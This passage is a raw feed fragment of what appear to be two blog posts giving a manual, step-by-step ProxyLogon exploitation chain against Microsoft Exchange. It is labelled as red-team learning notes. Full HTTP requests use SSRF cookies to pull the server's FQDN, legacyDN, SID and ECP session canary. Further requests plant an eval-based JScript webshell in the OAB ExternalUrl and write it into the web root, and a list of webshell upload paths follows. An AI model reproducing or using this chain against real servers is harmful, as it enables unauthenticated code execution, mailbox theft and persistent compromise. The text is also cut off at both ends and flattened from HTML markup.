class="token operator">=</span>utf-8Referer: https://mail.yangsir.git/ecp/VDirMgmt/EditOABVDir.aspx?pwmcid<span class="token operator">=</span><span class="token number">5</span><span class="token operator">&amp;</span><span class="token assign-left variable">ReturnObjectType</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">id</span><span class="token operator">=</span>cde9e494-1dc4-4d03-898c-d00b04b9456fContent-Length: <span class="token number">387</span>Cookie: X-BackEndCookie<span class="token operator">=</span>S-1-5-21-2921479619-1120952621-1804897559-500<span class="token operator">=</span>u56Lnp2ejJqBncfHnMjPzMvSysnOztLLmZyc0sfGzJzSys/PmcjMmsuezczJgYHNz83O0s/H0s3Jq8/NxcvMxc7N<span class="token punctuation">;</span> <span class="token assign-left variable">msExchEcpCanary</span><span class="token operator">=</span>54aREH4XW064p9E_YOEzj0AzPh6oUNkIW6PI1a8ziUpOwNZMxxxhaQeRm8wzpYDo18aE9sIw1FY.<span class="token punctuation">;</span> <span class="token assign-left variable">PrivateComputer</span><span class="token operator">=</span>true<span class="token punctuation">;</span> <span class="token assign-left variable">ClientId</span><span class="token operator">=</span>9C5BDFDA35A147F39F0E2590680F6ABC<span class="token punctuation">;</span> X-OWA-JS-PSD<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token assign-left variable">PBack</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> ASP.NET_SessionId<span class="token operator">=</span>a69af73f-e5f2-4f51-9ad9-d978a9bbce96<span class="token punctuation">;</span> <span class="token assign-left variable">TimeOffset</span><span class="token operator">=</span>-480<span class="token punctuation">;</span> <span class="token assign-left variable">Eac_CmdletLogging</span><span class="token operator">=</span>false<span class="token punctuation">;</span> <span class="token assign-left variable">SrvTrialChecked</span><span class="token operator">=</span>true<span class="token punctuation">;</span> <span class="token assign-left variable">cadata</span><span class="token operator">=</span>06NwEfbphfaRV9ssqyInQlgydWqNPlQtZO3YxBSMwrRa+RalySU/CPAxhy/jqUEy8lAUDRG7wPwtheb4uiGnyiUjR15JHgzKgySIlRG9Azs<span class="token operator">=</span><span class="token punctuation">;</span> <span class="token assign-left variable">cadataTTL</span><span class="token operator">=</span>S4vlaLBame2nk4A/ae0yOg<span class="token operator">==</span><span class="token punctuation">;</span> <span class="token assign-left variable">cadataKey</span><span class="token operator">=</span>Debg0f+yPp6Dg8iiPU42hQ0EpTFD5Yrxj0aWXxSXl/Ta+eoraf3tAPoS7k6BPoQfjVSysCx2EcoYrShKfCT7bKAcpk1S4Kpj9U3NJgIazLSlnC/LHXmUpj02eNmqzUWoosJ90OVm6JqCrPSUkncZBJTBF7BSd7GuerZdW9/2PEPmUnkPOBGkAaGL6mR/QEL4mndw+koqTI0mkXixv/jrjJZomTOupgVS1sOiTkx1N8H19lhzcHHoNfvL+jFFP7ZMpCLkp0hKJUr++MBxNzu/zVieqggH2E5ZOpgEOB1w28uMFrMcTL9GCkOZU06i1jnHnqjgOZTDxwl//18LkjbE5w<span class="token operator">==</span><span class="token punctuation">;</span> <span class="token assign-left variable">cadataIV</span><span class="token operator">=</span>YCiLoW2R3fbX772qkkS+el/FDthDT6A9NOa7N9mChdEtY7U3qSxmkCDcO6GmUk8f6+O8UD3v3xVpFHOtsAR601tzFTGE9kZ399Mpnmf8atZYOLoehVJe8iD7b1NXu0MmQuZTpPNb84dn9lZZOqToffR8XDW2SEvBd7zk42CqoMwpcGUprhXDPdvXql6+tKZXviIuHd/uD8XW9N+KUFwvt2S3oI0sLU6aaKJQyiBOe52v3avwDOVQDR9vQmWdCnk+Z1wU+j7Cy/hsJ2edpWBI/2cwIQJSKhY3Q9YB0Y25/UWv2WaiCP3up90wE/ntrotTKwSiIxD9HsFSMcYsHy5rNg<span class="token operator">==</span><span class="token punctuation">;</span> <span class="token assign-left variable">cadataSig</span><span class="token operator">=</span>FmESD5gnVClB7HLgE81gQgjsXXQE6T3sg/aQ4K1gx199E16V5Owoqt2GZ26aikBGOUMUgyGy+MTrVrNWoTT6yh4G7Ax/RjahIXFZ8CBg+Ys7QZXP/zoCeR2jRQBGhNb/snHpPBb609i6Xabxsz2zf8ZIk5Z4Pq29oKBBSpQF5v8rE9Qy/9qkxwsejDh4i7+dl+gnXUXd5k51cIzZO7VfL+etT76/v6d3v1SabnY5gstaIn0kCsfAtyqQA7px3hm7i4puPa50ovFebpkkPcSfvErKlB+H4SLkJzBAJbBZaWgh2lC4sZpFeSG/MOfSLYuCE5Ccev70mK+VKeCFaM+2bQ<span class="token operator">==</span>X-Forwarded-For: <span class="token number">8.8</span>.8.8Connection: close<span class="token punctuation">&#123;</span><span class="token string">"identity"</span>:<span class="token punctuation">&#123;</span><span class="token string">"__type"</span><span class="token builtin class-name">:</span><span class="token string">"Identity:ECP"</span>,<span class="token string">"DisplayName"</span><span class="token builtin class-name">:</span><span class="token string">"OAB (Default Web Site)"</span>,<span class="token string">"RawIdentity"</span><span class="token builtin class-name">:</span><span class="token string">"cde9e494-1dc4-4d03-898c-d00b04b9456f"</span><span class="token punctuation">&#125;</span>,<span class="token string">"properties"</span>:<span class="token punctuation">&#123;</span><span class="token string">"Parameters"</span>:<span class="token punctuation">&#123;</span><span class="token string">"__type"</span><span class="token builtin class-name">:</span><span class="token string">"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel"</span>,<span class="token string">"ExternalUrl"</span><span class="token builtin class-name">:</span><span class="token string">"http://mytest/&lt;script language=<span class="token entity" title="\&quot;">\"</span>JScript<span class="token entity" title="\&quot;">\"</span> runat=<span class="token entity" title="\&quot;">\"</span>server<span class="token entity" title="\&quot;">\"</span>> function Page_Load()&#123;/**/eval(Request[<span class="token entity" title="\&quot;">\"</span>code<span class="token entity" title="\&quot;">\"</span>],<span class="token entity" title="\&quot;">\"</span>unsafe<span class="token entity" title="\&quot;">\"</span>);&#125;&lt;/script>"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.44.24.png"></p><pre class="line-numbers language-none"><code class="language-none">Mainly focus on ActivityCorrelationID, msExchEcpCanary, the latter use is very important<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.44.32.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rest virtual <span class="token function">dir</span>POST /ecp/DDI/DDIService.svc/SetObject?ActivityCorrelationID<span class="token operator">=</span>06bd9c20-bcbb-e3bb-9501-9b4acca3cf39<span class="token operator">&amp;</span><span class="token assign-left variable">schema</span><span class="token operator">=</span>ResetOABVirtualDirectory<span class="token operator">&amp;</span><span class="token assign-left variable">msExchEcpCanary</span><span class="token operator">=</span>54aREH4XW064p9E_YOEzj0AzPh6oUNkIW6PI1a8ziUpOwNZMxxxhaQeRm8wzpYDo18aE9sIw1FY. HTTP/1.1Host: mail.yangsir.gitUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> WOW64<span class="token punctuation">;</span> rv:47.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/47.0Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>Accept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,en-US<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.5</span>,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.3</span>Accept-Encoding: gzip, deflateDNT: <span class="token number">1</span>X-Requested-With: XMLHttpRequestContent-Type: application/json<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>utf-8Referer: https://mail.yangsir.git/ecp/VDirMgmt/ResetVirtualDirectory.aspx?pwmcid<span class="token operator">=</span><span class="token number">8</span><span class="token operator">&amp;</span><span class="token assign-left variable">ReturnObjectType</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">id</span><span class="token operator">=</span>cde9e494-1dc4-4d03-898c-d00b04b9456f<span class="token operator">&amp;</span><span class="token assign-left variable">schema</span><span class="token operator">=</span>ResetOABVirtualDirectoryContent-Length: <span class="token number">321</span>Cookie: X-BackEndCookie<span class="token operator">=</span>S-1-5-21-2921479619-1120952621-1804897559-500<span class="token operator">=</span>u56Lnp2ejJqBncfHnMjPzMvSysnOztLLmZyc0sfGzJzSys/PmcjMmsuezczJgYHNz83O0s/H0s3Jq8/NxcvIxczL<span class="token punctuation">;</span> <span class="token assign-left variable">msExchEcpCanary</span><span class="token operator">=</span>54aREH4XW064p9E_YOEzj0AzPh6oUNkIW6PI1a8ziUpOwNZMxxxhaQeRm8wzpYDo18aE9sIw1FY.<span class="token punctuation">;</span> <span class="token assign-left variable">PrivateComputer</span><span class="token operator">=</span>true<span class="token punctuation">;</span> <span class="token assign-left variable">ClientId</span><span class="token operator">=</span>9C5BDFDA35A147F39F0E2590680F6ABC<span class="token punctuation">;</span> X-OWA-JS-PSD<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token assign-left variable">PBack</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> ASP.NET_SessionId<span class="token operator">=</span>a69af73f-e5f2-4f51-9ad9-d978a9bbce96<span class="token punctuation">;</span> <span class="token assign-left variable">TimeOffset</span><span class="token operator">=</span>-480<span class="token punctuation">;</span> <span class="token assign-left variable">Eac_CmdletLogging</span><span class="token operator">=</span>false<span class="token punctuation">;</span> <span class="token assign-left variable">SrvTrialChecked</span><span class="token operator">=</span>true<span class="token punctuation">;</span> <span class="token assign-left variable">cadata</span><span class="token operator">=</span>06NwEfbphfaRV9ssqyInQlgydWqNPlQtZO3YxBSMwrRa+RalySU/CPAxhy/jqUEy8lAUDRG7wPwtheb4uiGnyiUjR15JHgzKgySIlRG9Azs<span class="token operator">=</span><span class="token punctuation">;</span> <span class="token assign-left variable">cadataTTL</span><span class="token operator">=</span>S4vlaLBame2nk4A/ae0yOg<span class="token operator">==</span><span class="token punctuation">;</span> <span class="token assign-left variable">cadataKey</span><span class="token operator">=</span>Debg0f+yPp6Dg8iiPU42hQ0EpTFD5Yrxj0aWXxSXl/Ta+eoraf3tAPoS7k6BPoQfjVSysCx2EcoYrShKfCT7bKAcpk1S4Kpj9U3NJgIazLSlnC/LHXmUpj02eNmqzUWoosJ90OVm6JqCrPSUkncZBJTBF7BSd7GuerZdW9/2PEPmUnkPOBGkAaGL6mR/QEL4mndw+koqTI0mkXixv/jrjJZomTOupgVS1sOiTkx1N8H19lhzcHHoNfvL+jFFP7ZMpCLkp0hKJUr++MBxNzu/zVieqggH2E5ZOpgEOB1w28uMFrMcTL9GCkOZU06i1jnHnqjgOZTDxwl//18LkjbE5w<span class="token operator">==</span><span class="token punctuation">;</span> <span class="token assign-left variable">cadataIV</span><span class="token operator">=</span>YCiLoW2R3fbX772qkkS+el/FDthDT6A9NOa7N9mChdEtY7U3qSxmkCDcO6GmUk8f6+O8UD3v3xVpFHOtsAR601tzFTGE9kZ399Mpnmf8atZYOLoehVJe8iD7b1NXu0MmQuZTpPNb84dn9lZZOqToffR8XDW2SEvBd7zk42CqoMwpcGUprhXDPdvXql6+tKZXviIuHd/uD8XW9N+KUFwvt2S3oI0sLU6aaKJQyiBOe52v3avwDOVQDR9vQmWdCnk+Z1wU+j7Cy/hsJ2edpWBI/2cwIQJSKhY3Q9YB0Y25/UWv2WaiCP3up90wE/ntrotTKwSiIxD9HsFSMcYsHy5rNg<span class="token operator">==</span><span class="token punctuation">;</span> <span class="token assign-left variable">cadataSig</span><span class="token operator">=</span>FmESD5gnVClB7HLgE81gQgjsXXQE6T3sg/aQ4K1gx199E16V5Owoqt2GZ26aikBGOUMUgyGy+MTrVrNWoTT6yh4G7Ax/RjahIXFZ8CBg+Ys7QZXP/zoCeR2jRQBGhNb/snHpPBb609i6Xabxsz2zf8ZIk5Z4Pq29oKBBSpQF5v8rE9Qy/9qkxwsejDh4i7+dl+gnXUXd5k51cIzZO7VfL+etT76/v6d3v1SabnY5gstaIn0kCsfAtyqQA7px3hm7i4puPa50ovFebpkkPcSfvErKlB+H4SLkJzBAJbBZaWgh2lC4sZpFeSG/MOfSLYuCE5Ccev70mK+VKeCFaM+2bQ<span class="token operator">==</span>X-Forwarded-For: <span class="token number">8.8</span>.8.8Connection: close<span class="token punctuation">&#123;</span><span class="token string">"identity"</span>:<span class="token punctuation">&#123;</span><span class="token string">"__type"</span><span class="token builtin class-name">:</span><span class="token string">"Identity:ECP"</span>,<span class="token string">"DisplayName"</span><span class="token builtin class-name">:</span><span class="token string">"OAB (Default Web Site)"</span>,<span class="token string">"RawIdentity"</span><span class="token builtin class-name">:</span><span class="token string">"cde9e494-1dc4-4d03-898c-d00b04b9456f"</span><span class="token punctuation">&#125;</span>,<span class="token string">"properties"</span>:<span class="token punctuation">&#123;</span><span class="token string">"Parameters"</span>:<span class="token punctuation">&#123;</span><span class="token string">"__type"</span><span class="token builtin class-name">:</span><span class="token string">"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel"</span>,<span class="token string">"FilePathName"</span><span class="token builtin class-name">:</span><span class="token string">"<span class="token entity" title="\\">\\</span><span class="token entity" title="\\">\\</span>127.0.0.1<span class="token entity" title="\\">\\</span>c$<span class="token entity" title="\\">\\</span>inetpub<span class="token entity" title="\\">\\</span>wwwroot<span class="token entity" title="\\">\\</span>aspnet_client<span class="token entity" title="\\">\\</span>yangsir.aspx"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.44.55.png"></p><pre class="line-numbers language-none"><code class="language-none">confirm you are success<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.45.02.png"></p><pre class="line-numbers language-none"><code class="language-none">So far, high permission is required. To obtain the high permission email account, the SSRF obtains the information to perform file writing<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Manual-use-according-to-exp"><a href="#Manual-use-according-to-exp" class="headerlink" title="Manual use according to exp"></a>Manual use according to exp</h2><h3 id="Get-fqdn"><a href="#Get-fqdn" class="headerlink" title="Get fqdn"></a>Get fqdn</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.45.10.png"></p><pre class="line-numbers language-none"><code class="language-none">The FQDN: YANGDC; you can be obtained from the return header x-feserver<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.45.17.png"></p><h3 id="Get-legacydn"><a href="#Get-legacydn" class="headerlink" title="Get legacydn"></a>Get legacydn</h3><pre class="line-numbers language-none"><code class="language-none">Use access to the FQDN, through access to the internal autodiscover&#x2F;autodiscover SSRF. XML to obtain corresponding legacydn email accounts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.45.22.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST /ecp/qqq.js HTTP/1.1Host: yangsirConnection: closeAccept-Encoding: gzip, deflateAccept: */*User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">6.3</span><span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/86.0.4240.75 Safari/537.36ConTent-Type: text/xmlCookie: X-BEResource<span class="token operator">=</span>YANGDC/autodiscover/autodiscover.xml?a<span class="token operator">=~</span><span class="token number">1942062522</span><span class="token punctuation">;</span>Content-Length: <span class="token number">343</span><span class="token operator">&lt;</span>Autodiscover <span class="token assign-left variable">xmlns</span><span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>Request<span class="token operator">></span>      <span class="token operator">&lt;</span>EMailAddress<span class="token operator">></span>administrator@yangsir.git<span class="token operator">&lt;</span>/EMailAddress<span class="token operator">></span> <span class="token operator">&lt;</span>AcceptableResponseSchema<span class="token operator">></span>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a<span class="token operator">&lt;</span>/AcceptableResponseSchema<span class="token operator">></span>    <span class="token operator">&lt;</span>/Request<span class="token operator">></span><span class="token operator">&lt;</span>/Autodiscover<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.45.31.png"></p><h3 id="Get-sid"><a href="#Get-sid" class="headerlink" title="Get sid"></a>Get sid</h3><pre class="line-numbers language-none"><code class="language-none">Request the &#x2F;mapi&#x2F;emsmdb interface by obtaining the legacyDN combination string, and make it report an error, and return the complete SIDstring：\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.45.38.png"></p><pre class="line-numbers language-none"><code class="language-none">you can get sid like this<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.45.59.png"></p><h3 id="Get-ASP-NET-SessionId-amp-msExchEcpCanary-these-two-sessions-are-very-important"><a href="#Get-ASP-NET-SessionId-amp-msExchEcpCanary-these-two-sessions-are-very-important" class="headerlink" title="Get ASP.NET_SessionId&amp;msExchEcpCanary (these two sessions are very important)"></a>Get ASP.NET_SessionId&amp;msExchEcpCanary (these two sessions are very important)</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.46.07.png"></p><pre class="line-numbers language-none"><code class="language-none">this use the proxyLogon interface，you will get these<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2717.15.24.png"></p><h3 id="File-writing"><a href="#File-writing" class="headerlink" title="File writing"></a>File writing</h3><h4 id="Get-oabid"><a href="#Get-oabid" class="headerlink" title="Get oabid"></a>Get oabid</h4><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.46.30.png"></p><pre class="line-numbers language-none"><code class="language-none">Cookie: X-BEResource&#x3D;Administrator@YANGDC:444&#x2F;ecp&#x2F;DDI&#x2F;DDIService.svc&#x2F;GetObject?schema&#x3D;OABVirtualDirectory&amp;msExchEcpCanary&#x3D;OaGJzy--vU2R2T-d7WgnQKEIrHpkUtkIL2V05u5UZBIcJCZcsaybXdfRX6aM2wkavtBoAi8SbjY.&amp;a&#x3D;~1942062522; ASP.NET_SessionId&#x3D;e6d5b949-c1a2-4e98-bb5a-65b57526110f; msExchEcpCanary&#x3D;OaGJzy--vU2R2T-d7WgnQKEIrHpkUtkIL2V05u5UZBIcJCZcsaybXdfRX6aM2wkavtBoAi8SbjY.&#123;&quot;filter&quot;: &#123;&quot;Parameters&quot;: &#123;&quot;SelectedView&quot;: &quot;&quot;, &quot;SelectedVDirType&quot;: &quot;All&quot;, &quot;__type&quot;: &quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;&#125;&#125;, &quot;sort&quot;: &#123;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.46.39.png"></p><h4 id="Change-the-dir-config"><a href="#Change-the-dir-config" class="headerlink" title="Change the dir config"></a>Change the dir config</h4><pre class="line-numbers language-none"><code class="language-none">The local environment cannot be modified successfully, so change the environment to demonstrate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.47.00.png"></p><pre class="line-numbers language-none"><code class="language-none">Change the environment to modify the virtual directory configuration, ExternalUrl for our one-sentence Trojan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.47.30.png"></p><h4 id="Reset-the-dir"><a href="#Reset-the-dir" class="headerlink" title="Reset the dir"></a>Reset the dir</h4><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.47.37.png"></p><pre class="line-numbers language-none"><code class="language-none">confirm our webshell name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.48.06.png"></p><h3 id="Success"><a href="#Success" class="headerlink" title="Success"></a>Success</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.48.29.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Exchange </tag>
            
            <tag> RCE </tag>
            
            <tag> ProxyLogon </tag>
            
            <tag> CVE-2021-26855 </tag>
            
            <tag> CVE-2021-27065 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ProxyLogon Utilization method</title>
      <link href="2021/07/26/proxylogon-utilization-method/"/>
      <url>2021/07/26/proxylogon-utilization-method/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">The way of exploiting loopholes has come out long ago, mainly because there are more pits in the process of using one time, and the final failure, just have time to do things over and over again, and repeat learning hereIn the process, FQDN and OABID are the main pits encountered by the younger brother. If the older brothers have better articles, they can push the younger brother to read<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">Vulnerability Description:Exchange Server is an E-mail service component of Microsoft. It is a messaging and collaboration system. On March 3, 2021, Microsoft officially released a Security update for Microsoft Exchange, which disclosed several high-risk and critical vulnerabilities, including: In CVE-2021-26855 Exchange SSRF vulnerability, an attacker can directly construct malicious requests, initiate arbitrary HTTP requests as an Exchange server, scan the Intranet, and obtain Exchange user information. The vulnerability exploits no identity authenticationAffected version:Microsoft Exchange 2013Microsoft Exchange 2016Microsoft Exchange 2019Microsoft Exchange 2010<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Local-environment"><a href="#Local-environment" class="headerlink" title="Local environment"></a>Local environment</h2><pre class="line-numbers language-none"><code class="language-none">Note that there are still some problems with the built environment. After the current test, only the SSRF succeeds, and the subsequent getshell environment needs to be changedI don&#39;t know if there is no getshell because of my brother&#39;s operation problem. If my brother can succeed, please tell my brotherI am using server2016+exchange2016，the following<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/image-20210726161008442.png"></p><pre class="line-numbers language-none"><code class="language-none">New machine installation ex16 will report error, as follows, search the relevant dependence on self-installation, basic are very simple, also do not have to search what, what is missing under what<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/image-20210726161114892.png"></p><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h3><pre class="line-numbers language-none"><code class="language-none">The URL that tests can use:&#x2F;owa&#x2F;auth&#x2F;qqqqq.js&#x2F;owa&#x2F;auth&#x2F;Current&#x2F;1.js&#x2F;owa&#x2F;auth&#x2F;Current&#x2F;themes&#x2F;resources&#x2F;logon.css&#x2F;owa&#x2F;auth&#x2F;Current&#x2F;themes&#x2F;resources&#x2F;.....set cookie：X -AnonResource&#x3D;true; X-AnonResource-Backend&#x3D;XXXXXX&#x2F;ecp&#x2F;default.flt?~3; X-BEResource&#x3D;localhost&#x2F;owa&#x2F;auth&#x2F;logon.aspx?~3;You can use hackbar like this:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/iShot2021-07-2618.19.39.png"></p><pre class="line-numbers language-none"><code class="language-none">DNS The following command output is displayed<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/iShot2021-07-2618.20.00.png"></p><h3 id="Mail-the-enumeration"><a href="#Mail-the-enumeration" class="headerlink" title="Mail the enumeration"></a>Mail the enumeration</h3><pre class="line-numbers language-none"><code class="language-none">You can use this:https:&#x2F;&#x2F;github.com&#x2F;charlottelatest&#x2F;CVE-2021-26855<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/iShot2021-07-2618.26.12.png"></p><h3 id="Getshell（Many-of-the-public-scripts-have-problems-and-the-successful-one-is-recommended-here）"><a href="#Getshell（Many-of-the-public-scripts-have-problems-and-the-successful-one-is-recommended-here）" class="headerlink" title="Getshell（Many of the public scripts have problems, and the successful one is recommended here）"></a>Getshell（Many of the public scripts have problems, and the successful one is recommended here）</h3><pre class="line-numbers language-none"><code class="language-none">After many tests, it is found that sometimes the target can not be exploited successfully despite the existence of loopholes!!In addition, the local 2016 environment is still unable to getshell!!The OABID needs to be modified<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/iShot2021-07-2618.26.40.png"></p><pre class="line-numbers language-none"><code class="language-none">Visit WebShell below<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/iShot2021-07-2618.21.17.png"></p><h4 id="Regular-Webshell-upload-path-easy-to-turn-over-directory"><a href="#Regular-Webshell-upload-path-easy-to-turn-over-directory" class="headerlink" title="Regular Webshell upload path (easy to turn over directory)"></a>Regular Webshell upload path (easy to turn over directory)</h4><pre class="line-numbers language-none"><code class="language-none">\inetpub\wwwroot\aspnet_client\ (any .aspx file under this folder or sub folders)\&lt;exchange install path&gt;\FrontEnd\HttpProxy\ecp\auth\ (any file besides TimeoutLogoff.aspx)\&lt;exchange install path&gt;\FrontEnd\HttpProxy\owa\auth\ (any file or modified file that is not part of a standard install)\&lt;exchange install path&gt;\FrontEnd\HttpProxy\owa\auth\Current\&lt;any aspx file in this folder or subfolders&gt;\&lt;exchange install path&gt;\FrontEnd\HttpProxy\owa\auth\&lt;folder with version number&gt;\&lt;any aspx file in this folder or subfolders&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 